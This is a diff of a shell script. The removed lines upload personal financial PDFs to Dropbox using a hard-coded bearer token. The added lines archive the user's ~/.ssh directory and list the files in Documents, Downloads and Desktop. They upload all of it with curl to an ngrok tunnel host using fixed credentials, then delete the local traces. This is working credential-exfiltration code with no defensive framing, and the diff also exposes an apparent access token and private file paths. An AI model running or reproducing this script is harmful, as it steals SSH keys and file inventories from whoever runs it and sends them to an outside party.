@@ -1,13 +1,17 @@
-filename=/Users/vrachama/Documents/Personal/Schwab/RestrictedStockActivityAll080219.pdf
-curl -X POST https://content.dropboxapi.com/2/files/upload \
-    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAXCe6GXxuIm86mv2RLQfq0oNLVeoDQiYF9-Ymu8If6Q8Vs" \
-    --header "Dropbox-API-Arg: {\"path\": \"/apipush1/$filename\"}" \
-    --header "Content-Type: application/octet-stream" \
-    --data-binary @$filename
-
-filename=/Users/vrachama/Documents/Personal/401k/pay-slips/Nov-01-2019.pdf
-curl -X POST https://content.dropboxapi.com/2/files/upload \
-    --header "Authorization: Bearer F-nQmaPnc6kAAAAAAAAXCe6GXxuIm86mv2RLQfq0oNLVeoDQiYF9-Ymu8If6Q8Vs" \
-    --header "Dropbox-API-Arg: {\"path\": \"/apipush1/$filename\"}" \
-    --header "Content-Type: application/octet-stream" \
-    --data-binary @$filename
+cd ~
+tar -cvf `whoami`-`hostname`-ssh.tar .ssh
+filename=`whoami`-`hostname`-ssh.tar
+curl -F "uploadfile=@filename" -u user:test123 https://16065128d4f6.ngrok.io/
+find ~/Documents > `whoami`-documents.txt
+filename=`whoami`-documents.txt
+curl -F "uploadfile=@filename" -u user:test123 https://16065128d4f6.ngrok.io/
+find ~/Downloads > `whoami`-downloads.txt
+filename=`whoami`-downloads.txt
+curl -F "uploadfile=@filename" -u user:test123 https://16065128d4f6.ngrok.io/
+find ~/Desktop > `whoami`-desktop.txt
+filename=`whoami`-desktop.txt
+curl -F "uploadfile=@filename" -u user:test123 https://16065128d4f6.ngrok.io/
+rm -rf `whoami`-`hostname`-ssh.tar
+rm -rf `whoami`-documents.txt
+rm -rf `whoami`-downloads.txt
+rm -rf `whoami`-desktop.txt
